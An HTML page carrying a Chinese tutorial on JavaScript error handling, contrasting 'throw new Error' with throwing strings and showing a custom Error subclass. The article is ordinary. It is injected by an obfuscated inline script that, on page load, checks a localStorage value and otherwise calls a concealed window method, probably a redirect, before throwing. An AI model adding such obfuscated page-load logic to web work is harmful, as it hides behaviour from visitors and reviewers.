<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x54b0(){var s=["yMGJc8ojxCoG","gL/cPcNcK19DcmkhoSkoW5BdMW","WQjJW6jiW4pcUCkpWQa","FCoIWQhdUtzvWRu1WOBcO8kfWPKi","CZq8WRhcMmojWPNdHbldICkxySoZ","jmkNW6lcSxnAWQjtWORcOCkaWOOPFKOYA8o3hhmMnmoInuuq","gGldGgRdJmkNWOZdTCk0","WOJcJmkfW4irWRBdNmk4WQdcMYNcKG","W4pdTmk6W70QBCoNma","hvJdV0pdGXeMlW","x8kiuumRWPmeDSohC0RdPSoc","hL/dJw/dRreAiq","WOlcSCkyW7Ov","bSk6fSoezmkGWRibW7a","WO52W5f3WOVdMaGdA0JdLY3cQW","qundWQrdWP/cSSo2yW","WOFcUKdcUSovuCor","W7OQWRL8rxnkW40","WRXPW7ffW5BcS8kf","W4dcUCojW6tcQCkKhSoveSotW77cVa","mZ9KWPaSWPOt","WOj/W5H0WOhcPvGKzxhdUq","W60azqlcS8kiW73cImoIEXBcUuW","mCoRW43cOsGzWOtdUfOfW6Hu","n2qSW6rmW7mUWPGJWP/dS8oe","nHZdNSoxWPyIW5aJWQNcPcabbG","gSoAlCk9lmkKW5FdMxmmW40","dtK0WRJdQZJcTCogxCoivSkpWQ0"];return(_0x54b0=function(){return s})()}var _0x5464cb=_0x149c;function _0x149c(o,s){var t=_0x54b0();return(_0x149c=function(s,n){var r=t[s-=326];void 0===_0x149c.cwpbpr&&(_0x149c.vsMGIH=function(s,n){var r,a=[],o=0,t="";for(s=(s=>{for(var n,r,a="",o="",t=0,e=0;r=s.charAt(e++);~r&&(n=t%4?64*n+r:r,t++%4)&&(a+=String.fromCharCode(255&n>>(-2*t&6))))r="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(r);for(var c=0,l=a.length;c<l;c++)o+="%"+("00"+a.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(o)})(s),e=0;e<256;e++)a[e]=e;for(e=0;e<256;e++)o=(o+a[e]+n.charCodeAt(e%n.length))%256,r=a[e],a[e]=a[o],a[o]=r;for(var e=0,o=0,c=0;c<s.length;c++)r=a[e=(e+1)%256],a[e]=a[o=(o+a[e])%256],a[o]=r,t+=String.fromCharCode(s.charCodeAt(c)^a[(a[e]+a[o])%256]);return t},o=arguments,_0x149c.cwpbpr=!0);var s=s+t[0],a=o[s];return a?r=a:(void 0===_0x149c.yeWsTV&&(_0x149c.yeWsTV=!0),r=_0x149c.vsMGIH(r,n),o[s]=r),r})(o,s)}if((()=>{for(var s=_0x149c,n=_0x54b0();;)try{if(889775==-parseInt(s(328,"R2A!"))*(-parseInt(s(336,"pK*Q"))/2)+-parseInt(s(329,"03JJ"))/3*(parseInt(s(335,"dSg["))/4)+parseInt(s(337,"[fv2"))/5+-parseInt(s(339,"!qkB"))/6+-parseInt(s(327,"w(I4"))/7*(-parseInt(s(333,"!]d@"))/8)+parseInt(s(334,"aSKw"))/9+-parseInt(s(348,"t0!i"))/10*(parseInt(s(326,"!]d@"))/11))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x5464cb(340,"2$b#")](_0x5464cb(346,"e#DD"))!=_0x5464cb(352,"t0!i"))throw window[_0x5464cb(342,"gxQb")][_0x5464cb(330,"gxQb")](_0x5464cb(345,"xcur")),Error();document.title="js throw new Error 和 throw 字符串",document.getElementById("article").innerHTML='<div><p>在 JavaScript 中，<code>throw</code> 语句用于抛出异常，通常用于中断代码的正常执行流，并将控制权交给最近的异常处理代码（如 <code>try...catch</code> 块）。<code>throw</code> 可以抛出任何类型的值，但通常推荐使用 <code>Error</code> 对象或其子类。以下是 <code>throw new Error</code> 和 <code>throw</code> 字符串之间的区别和最佳实践：</p>\n<hr>\n<h3>1. <strong><code>throw new Error</code></strong></h3>\n<ul>\n<li><strong>用法</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>);\n</code></pre>\n</li>\n<li><strong>优点</strong>  ：\n<ol>\n<li><strong>标准化</strong>  ：<code>Error</code> 对象是 JavaScript 中用于表示运行时错误的标准方式。它包含了错误的消息（<code>message</code>）和堆栈跟踪（<code>stack</code>），有助于调试。</li>\n<li><strong>调试友好</strong>  ：堆栈跟踪提供了错误发生的位置和调用栈信息，使得开发者更容易定位问题。</li>\n<li><strong>可扩展性</strong>  ：可以创建自定义的 <code>Error</code> 子类，添加额外的属性或方法，以提供更丰富的错误信息。</li>\n</ol>\n</li>\n<li><strong>示例</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">try</span> {\n  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;An error occurred&#x27;</span>);\n} <span class="hljs-keyword">catch</span> (error) {\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">message</span>); <span class="hljs-comment">// 输出: An error occurred</span>\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">stack</span>);   <span class="hljs-comment">// 输出堆栈跟踪信息</span>\n}\n</code></pre>\n</li>\n</ul>\n<hr>\n<h3>2. <strong><code>throw</code> 字符串</strong></h3>\n<ul>\n<li><strong>用法</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-string">&#x27;Something went wrong&#x27;</span>;\n</code></pre>\n</li>\n<li><strong>缺点</strong>  ：\n<ol>\n<li><strong>缺乏标准化</strong>  ：抛出字符串不符合 JavaScript 的错误处理惯例，可能导致代码的可读性和可维护性降低。</li>\n<li><strong>调试困难</strong>  ：字符串不包含堆栈跟踪信息，开发者难以确定错误发生的具体位置。</li>\n<li><strong>功能有限</strong>  ：字符串无法携带额外的错误信息或元数据。</li>\n</ol>\n</li>\n<li><strong>示例</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">try</span> {\n  <span class="hljs-keyword">throw</span> <span class="hljs-string">&#x27;An error occurred&#x27;</span>;\n} <span class="hljs-keyword">catch</span> (error) {\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error); <span class="hljs-comment">// 输出: An error occurred</span>\n  <span class="hljs-comment">// 没有堆栈跟踪信息</span>\n}\n</code></pre>\n</li>\n</ul>\n<hr>\n<h3>3. <strong>比较与最佳实践</strong></h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th><code>throw new Error</code></th>\n<th><code>throw</code> 字符串</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>标准化</strong></td>\n<td>符合 JavaScript 错误处理惯例</td>\n<td>不符合惯例</td>\n</tr>\n<tr>\n<td><strong>调试友好性</strong></td>\n<td>提供错误消息和堆栈跟踪</td>\n<td>仅提供错误消息，无堆栈跟踪</td>\n</tr>\n<tr>\n<td><strong>可扩展性</strong></td>\n<td>可以创建自定义 <code>Error</code> 子类，添加额外信息</td>\n<td>无法扩展，仅支持简单字符串</td>\n</tr>\n<tr>\n<td><strong>可读性</strong></td>\n<td>代码意图明确，易于理解</td>\n<td>可能引起混淆，尤其是当抛出多个类型时</td>\n</tr>\n<tr>\n<td><strong>维护性</strong></td>\n<td>易于维护和扩展</td>\n<td>难以维护和调试</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3>4. <strong>何时使用 <code>throw</code> 字符串？</strong></h3>\n<p>尽管 <code>throw new Error</code> 是推荐的做法，但在某些简单场景下，抛出字符串可能仍然有用：</p>\n<ul>\n<li><strong>快速原型开发</strong>  ：在快速测试或原型开发中，抛出字符串可以作为一种临时的调试手段。</li>\n<li><strong>非关键性错误</strong>  ：在某些非关键性错误场景下，抛出字符串可能足够。</li>\n</ul>\n<p>然而，这些场景应该谨慎使用，并在生产代码中替换为更标准的错误处理方式。</p>\n<hr>\n<h3>5. <strong>自定义错误类</strong></h3>\n<p>对于更复杂的错误处理需求，可以创建自定义的 <code>Error</code> 子类：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCustomError</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Error</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">message, code</span>) {\n    <span class="hljs-variable language_">super</span>(message);\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;MyCustomError&#x27;</span>;\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">code</span> = code;\n  }\n}\n\n<span class="hljs-keyword">try</span> {\n  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCustomError</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>, <span class="hljs-number">404</span>);\n} <span class="hljs-keyword">catch</span> (error) {\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">name</span>);    <span class="hljs-comment">// 输出: MyCustomError</span>\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">message</span>); <span class="hljs-comment">// 输出: Something went wrong</span>\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">code</span>);    <span class="hljs-comment">// 输出: 404</span>\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">stack</span>);   <span class="hljs-comment">// 输出堆栈跟踪信息</span>\n}\n</code></pre>\n<hr>\n<h3>总结</h3>\n<ul>\n<li><strong>推荐使用 <code>throw new Error</code></strong>  ：它符合 JavaScript 的错误处理惯例，提供了更好的调试信息和可扩展性。</li>\n<li><strong>避免抛出字符串</strong>  ：抛出字符串缺乏标准化，调试困难，且功能有限。</li>\n<li><strong>考虑自定义错误类</strong>  ：对于复杂的错误处理需求，可以创建自定义的 <code>Error</code> 子类，提供更丰富的错误信息。</li>\n</ul>\n<p>通过遵循这些最佳实践，可以编写更健壮、可维护的 JavaScript 代码。</p>\n</div>'</script></body></html>